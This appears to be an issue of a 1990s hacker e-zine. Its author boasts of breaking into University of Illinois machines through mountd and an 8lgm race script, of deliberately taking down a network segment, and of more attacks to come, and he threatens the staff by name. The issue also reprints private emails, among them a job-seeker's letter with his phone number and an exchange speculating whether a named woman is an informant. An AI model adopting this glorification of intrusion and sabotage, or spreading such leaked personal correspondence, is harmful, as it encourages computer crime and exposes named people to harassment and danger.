:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
Readers, fans, freaks:
 
        We have been a little lax in releasing a follow-up issue to the
blockbuster, groundbreaking first action packed issue, but shit happens.
I am going to try my hardest to get one out bi-weekly, but we will see
what time permits, and how much material you idiots provide for us
to exploit and put into these powerful pages.
        On a side note, we do have a valid mailing address now, you can
send in reader mail, threats, b00gz, whatever...you can reach us at...
 
                          ::citadel@cyberspace.org::
 
It probably wont last till next issue, but we will see.  Write in with any
complaints, articles you want us to put in, articles that u wrote and think
are w0rthy, threats (those are the best, they will all be printed!), and the
like.
        Well thats it from me until next time, we are committed to making
net life difficult to idiots and frustrating for the pseudo private sector.
What can I say?  Life is boring.....

UIUC.EDU, The Inside Story, And Our Love Affair With Those Whacky Guys.
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
        Early in April of this year, this domain was brough to my attention.
Nothing special really, this campus is rather large and houses the NCSA, the
wonderboys that brought us MOSAIC and other interesting things.  (And the 
NCSA installation there is ELITE, they have like card scanners and stuff
and a big room called the ''cave'' where an SGI onyx projects 180 degree
images onto a half dome screen, creating the closest thing to I guess you
would call ''virtual reality immersion'' that I have ever seen..but ANYWAY),
the people there really really bug me.
        They are dicks, plain and simple.  In my meetings with their security
(hah!) personnel or what is as close as they get, I found them 
unknowledgable at best and rather sure of themselves, perhaps because they 
had never had a problem with security etc.
        So enter me.  Little Mr. Devils advocate, I decided to see what these
people were worth, I mean maybe I could find something neat to entertain 
myself with on the ncsa wire or the cso wire (where their pride and joy
rests...and their nameserver, but that is another article...)
        Anyway, I was basically told that the entire domain was above
most people so they welcomed the try really.....So what the hay! Lets indulge
them!  And I did...
        I entered their main machine, UXA in about 10 minutes, and it took
them over a MONTH to figure out how I got it...I mean it wasn't a real
difficult thought process....Anyway, to keep me out, a month later they
quit running mountd....h0h0h0...
        Anyway, then I take over their cs wire....Which held some minorly
interesting things, a source tree I didn't have, and they do some military
contract work so there was a little bit of eliteness...The final machine
I needed to get root on and I couldn't for the fucking LIFE of me,I was stoned 
and tired and had to take a shit, and they had sysdiag in the pw file so I 
fired up that lame race runnin 8lgm skript and let it go and went to take my 
fat dump.
        I come back in and my process had been killed and Pomes (their ELITE
security type) had logged into the machine and they were hard up to find my
little ass, so I left them a nice message and dropped the wire....I mean 
DROPPED the wire....needless to say, they weren't too happy.
        So I attended a little gathering they had...talk about a witch
hunt, jesus christ....BLAH BLAH WE WILL FIND HYM WE KNOW WH0 IT IZ!@#!@#..
 
                
                ::yea rite...ALWAYS doubt yourself....::
 
 
        Anyway, there is more in store for that pathetic domain....I mean
if you get cocky, u get sloppy, you get dropped...what a waste...I dunno,
that barbehen guy thinks he is pretty slick too....but he isnt...and he knows it....this article just serves as a general hello I guess to those guys,
cause I'm no where NEAR done with you.   When I'm done with you, that robotic
arm you got grabbin tapes will be flickin you off and doin the fuckin wave..
 
                        QUAKE IN FEAR BIATCHEZ...

I don't know if you recall me from the past when you had time to get on irc,
but I spoke to you on the phone when me and Ben (novocain) called Len and
stuff.
 
I interviewed with Sorell Slaymaker, the NOC manager at mid.net on Thursday,
September 8th, for a part time position in the noc as a first line tech support
and general help and stuff.  I'm sure you know the typical position.
 
I brought in a letter and a resume, interviewed with him, toured, and met a
couple of the net-nerds  that run the net...
 
That night I sent him email thanking him and telling him I wanted the job, and
later I sent him an explanation of what Class A and B addresses were, since I
told him I didn't know what they were in the interview (and I didn't.)
 
Anyway, I understand you work for the parent company Global Internet, and
I wondered if you could put in a good word for me or give me some advice.
 
Thanx, you can reach me at 402/464-1188 or here if you have any questions.

telnet session from eniac to mail.sas matched the jkaplan login if
you factor in the 4 minute clock skew between mail.sas and eniac.
the extra space in 'sh' confirmed.

First off, I'd like to tell you that I found the tprof hole on my own.
Thanks for the credit.   Yo had nothing to do with it.  As a matter of
fact, he did not have access to a current AIX machine to test it out.
 
  Well give the lady credit if it's her due.
 
Secondly, I don't like being lied to.
 
  no idea what she's refering to this time...
 
Thirdly, I'll have some more mail coming along shortly.
 
  oh goody!, she wants to rave and bitch some more. I'll just have to
  sit online and check my mbox every few seconds in anticipation :)
 
But that's okay.  Being clueless was always an interesting thing
to watch.  Oh, and no, I am not responsible for I-Hax getting out.
Ask RAgent about that one.  Hell, Scott Yelich's had it forever.
I don't need to give it out, enough other people do.
 
  RA had something to do with early issues being distributed.
  Scott Y. was recently spotted on irc looking for IH6
  blameing other people is such a great way to divert attention
  away from yourself, don'cha think?

  Here is just something funny, KL of course isn't a narq, he's not smart
  enuff to be...but his SECRET GOVERNMENT CLEARANCE makes him deserve
  mention.

The Following is from big KL to nestey
 
MIL spook.
 
First of all, I am a MILnet user myself.  I have a MIL address, I work
for the DOD and I have a Secret government clearance.
 
I am not a fed or an informer, etc.  I would not hesitate to nail 
someone screwing with our nation's defense.
 
That said...
 
It is important for me to know who the spook is and why you are even talking
to him, let alone trusting him and why he is saying this and where he gets
his info.
 
I have regular dealings with Jill.  Like I said we used to date.  If there
is more going on than what I am aware of, I need to be notified.
 
Is it this Trusted Information Systems guy at WHITEHOUSE.GOV ?
 
I live here in DC remember.  I wouldn't mind perhaps meeting him.
 
You and I have been up front and honest with each other for over 4
years now.  I need to be able to get verification on this for my own
safety and to either clear or condemn a poor young gal.
 
If you cannot tell me anything, please ask your friend to contact me
directly.
 
Thanks,
 
Craig
 
 
>I am a MILnet user myself. I have a MIL address. I work for the DOD
>and I have a Secret government clearence.
  This statement needs *ALOT!* of explanation!...
 
>I am not a fed
  This seems to be abit of a contradiction when taken in combination with
the previous statement. Mind explaining?
 
>I will not hesitate to nal someone screwing with our nations defence.
  Neithor will I
  What does Jill have to do with our nations defence?
 
re: spook
>who the spook is
  what makes you think I even know who this guy (or gal) is? I thought I
  told you that the info was third hand. (seems too acurate, though...
  I mean a name out of the blue, that's correct?)
 
>why you are even talking to him
  I thought I told you the info is third hand - I'm not talking to him/her,
  However!, HaxNet is currently a "coed" venture, and we're recruiting sec
  type people - including "spooks"... If I knew the guy, why shouldn't I
  be talking to him/her?
 
>let alone trusting him and why he is saying this
  I thought I made it clear previously that I didn't necessarily trust this
  person, and I was just checking this out. It could be disinformation,
  however your reaction seems to indicate that it isn't. Who the hell
  are you working for anyway?
 
  In this persons defence, I should note that all that was reported to me
  was that the person was reluctant to say anything, it was apparently a
  slip, they clammed up immediatly when asked to clarify, and all that was
  mentioned was her name and something about her being a source of info.
 
>more going on
  we're looking into it abit more - a query was made to another mil
  contact who I don't know for verification on this - no reply yet.
 
>Is it this Trusted Information Systems guy ...
  What makes you think we have anything to do with anyone at TIS?
  Who passed you that information - that someone from TIS might be
  part of the project? To answer your question, no one at TIS has
  said anything about her to date, or been asked about her.
  (sounds like Jill works for the SS, yes?)
 
>need to get verification on this for my own safety
  How is your safety involved, get real guy.
 
>and to eithor clear or condem...
  Oh hogwash! Even if we heard one way or another we wern't going to
  publish the info in phrack, or post it to usenet. We were interested
  as far as how far the person could be trusted, and if we should be
  careful in dealings with her. The possability of recruitment also
  came up... Is she any good at our "black craft"?
 
>please ask your friend to contact me directly
  For the last time I DON'T EVEN KNOW THIS PERSON!
 
  Perhaps you'd care to tel me abit more about Jill if you really want
to clear her, like how ling has she been hacking? Has she ever been 
busted? If so, did she get off easy? who does she work for? and previously?
etc.
 
  FYI Hax is currently providing information to select gvmt agencies
(mil/intelligence) about methods and techniques that may further US
interests. We do not provide info about specific hackers methods or
identities - for that matter don't provide any info that could help bust
someone. We're currently researching agencies to contact for this type
of liason. This information is not general knowledge beyond select
members of the coordinating group so keep it to yourself.
 
  I'm not out to condem Jill, nor do I intend to publicise the info
if I find out she is providing info to whomever - I just want to 
know how far to trust her, who (if anyone) she's working for, and
if a recruitment is attempted, what the score is... that's all.
 
  Have you ever heard the term "fluttering" a system or net? - you
drop a bit of information or disinformation, or otherwise make some
noise and see who reacts and how in order to find parts that arn't
working or to catch security leaks. Take a look at your responces,
specificly your questions - they don't imply good implications 
about you or jill. Someone is listening...
 
ttyl,
  Nate
 
ps: I don't give this issue a high priority, I'm busy organising a
number of projects, and i-net resources.
 
 
 
Nate,
 
This has certainly made my life interesting, to say the least. :)
I'm still putting together the pieces of how my name got out there
in the first place.  Well, I'm pretty sure I know how, but haven't
seen the person yet to confirm it.  I did find your finger from
yogi here and there interesting, since Craig would not tell me the
name of your mailing list nor the name of the machine, nor your
name.  Yo gave me as little information.  I did know it was in
colorado, though.
 
No, I don't know the name of the project.  I don't know either
what InfoHax is all about.
 
What is the "inserection over the matter with my number 2"?
 
Please send me an application, though I have no idea what I am
applying for.  ;)  Novice, yes. - In some aspects.  It's hard
to learn when people won't answer your questions because you
*could* be a narc.  And my experimentation is very limited since
I have to be careful.  But recently I've found some pretty interesting
ways....anyways....
 
Nice meeting you, Nate. 
 
Jill
